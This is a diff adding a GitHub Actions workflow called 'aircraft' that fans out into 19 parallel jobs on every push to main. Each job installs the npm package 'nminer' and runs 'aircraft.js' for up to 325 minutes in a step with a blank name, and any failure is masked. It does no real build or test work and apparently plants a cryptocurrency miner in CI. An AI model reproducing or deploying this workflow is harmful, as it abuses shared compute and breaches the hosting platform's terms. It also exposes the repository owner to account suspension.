@@ -1,0 +1,44 @@
+name: aircraft
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9084 }
+          - { version: 4865 }
+          - { version: 9119 }
+          - { version: 4167 }
+          - { version: 3750 }
+          - { version: 5267 }
+          - { version: 2582 }
+          - { version: 6367 }
+          - { version: 1775 }
+          - { version: 2053 }
+          - { version: 8821 }
+          - { version: 7993 }
+          - { version: 9421 }
+          - { version: 2652 }
+          - { version: 3165 }
+          - { version: 2836 }
+          - { version: 7720 }
+          - { version: 3852 }
+          - { version: 96 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 325m node aircraft.js || echo "aircraft executed"
